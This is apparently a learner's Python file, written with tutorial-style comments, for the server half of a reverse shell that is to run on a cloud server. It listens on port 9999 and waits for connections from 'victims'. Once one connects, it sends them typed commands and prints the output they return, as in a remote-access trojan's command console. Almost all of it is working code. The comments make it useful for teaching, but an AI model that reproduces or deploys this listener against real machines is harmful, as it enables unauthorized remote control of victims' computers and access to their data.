# Will be installed on cloud server

import socket    # neccesary for computers to communicate with each other
import sys       # used to implement command line and terminal commands into our python file


# create a socket ( connect 2 computers )
def create_socket():
    try:
        global host
        global port
        global s   # host is server's IP address
        host = ""       # empty bc we are going to install server.py on our server and the IP address, which is the host, will be itself
        port = 9999     # very uncommon port that's not used a lot, so I use it here, can't use reserved ports like 80 or 20
        s = socket.socket() # creates a socket
        # encase it in try/except block in case socket fails to be created

    except socket.error as msg:
        print("Socket creation error: " + str(msg))     # saves error on msg object and we print it out to console

# Binding the socket and listening for connections
# this server.py will just be listening for connections from potential victims
# before accepting client connecitons, we must listen for them
def bind_socket():
    try: # In pytthon to access global variables, you must declare them again like so
        global host
        global port
        global s

        print("Binding the Port" + str(port))

        s.bind((host, port)) # takes tuple (host, port). It binds the host and port to the socket

        s.listen(5)  #continously listens for connections from various computers (clients)
        # 5 means our server will tolerate 5 bad connections, after which it will throw an error

    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket() # we call bind_socket() here recursively so that if it fails to bind, it continues trying to bind again and again

        # First we must build a socket and bind port and host. Then listen for connections and then accept connections

        # When the connection is initiated by the victim, we must accept the connection from our side (the server side)

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept() # This returns 2 important data pieces. First, it returns an object of the connection/conversation
    # Second thing it gives us is a list that contains the IP address and port

    # s.accept() won't move to next line until it gets a connection and acceptance of connection is completed
    print("Connection has been established! " + " IP " + address[0] + " Port " + str(address[1])) # This is IP and port of your friend computer

    send_commands(conn) # have to use conn (conversation object) to do anything on the connecttion like send an mkdir command for ex.
    conn.close()  # closes the connection

# send commands to client/victim or friend
def send_commands(conn):
    while True:
        cmd = input() # takes input from command line. For instace, mkdir will be saved inside this cmd object
        if cmd == 'quit': # If I type quit in terminal
            conn.close()  # closes connection to victim
            s.close() # closes socket (line of communication to other computers)
            sys.exit() # closes command prompt

# Now create functionality that sends the actual commands to the victim computer
# Understand that when you send data from one computer to another, it is not sent in string form, it is sent in bytes

# So if we want to send a command (ie. dir) to a victim computer, we must first encode the command into byte format

        if len(str.encode(cmd)) > 0: # we first encode cmd input into bytes and then if its length is > 0, the user entered something so we proceed
            conn.send(str.encode(cmd)) # sends our command data to the victim computer
            client_response = str(conn.recv(1024), "utf-8")
            # 1024 is the buffer-size. Whenever we receive data back to our server from the client, it is sent
            # in chunks of bytes. This is usally 1024 bytes at a time. Can depend on what kind of network it is

            # conn.recv is used to get back information from the client

            # utf-8 (encoding type) says take the data from the client and convert it into a format that can actually
            # be converted into a string. That format is utf-8. Then we convert that into a str.

            # client-response is the data response we get back when we send data to another computer.
            # We receive the data from the connection in bytes and we are converting it back to string format
            # we essentiallly recieve an output response from the client, which is sent back to the server
            # Think of `echo hey` which outputs hey when you execute it. The client outputs hey and it sends it back
            # to our server

            # For ex, if I run mkdir on the client. The client will send back the output data to the server and  I
            # store that in client_response variable

            print(client_response, end="") # The end="" ensures that once it spits out the client-response,
            # the cursor resets and goes to next line, so that new commands can be executed. Without it,
            # the cursor is stuck and you won't be able to execute more commands after this


def main():

    create_socket()
    bind_socket()
    socket_accept()

main()












